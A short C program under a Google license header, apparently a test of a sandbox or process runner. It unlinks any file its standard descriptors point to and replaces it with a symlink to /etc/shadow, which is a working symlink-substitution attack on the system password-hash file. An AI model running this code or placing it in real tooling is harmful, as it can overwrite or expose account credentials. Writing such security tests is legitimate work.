/*
 * Copyright 2014 Google Inc. All rights reserved
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <unistd.h>
#include <stdio.h>

#define TARGET_FILE "/etc/shadow"

int main(void) {
  int fd;
  char fdpath[256], outpath[256];
  FILE *fp;
  int len;

  for(fd = 0; fd <= 2; fd++) {
    printf("fd %d ...\n", fd);
    sprintf(fdpath, "/proc/%d/fd/%d", (int)getpid(), fd);
    len = readlink(fdpath, outpath, sizeof(outpath) - 1);
    if (len == -1) {
      printf("failed to readlink(2)\n");
      continue;
    }
    outpath[len] = '\0';
    if (strncmp(outpath, "/dev/", 5) == 0) {
      printf("skipping because it is connected to pts\n");
    } else {
      printf("trying to make symlink %s -> %s...\n", outpath, TARGET_FILE);
      if (unlink(outpath) == -1) {
        printf("failed to unlink(2)\n");
        continue;
      }
      if (symlink(TARGET_FILE, outpath) == -1) {
        printf("failed to symlink(2)\n");
        continue;
      }
      printf("successfully replaced.\n");
    }
  }

  return 0;
}
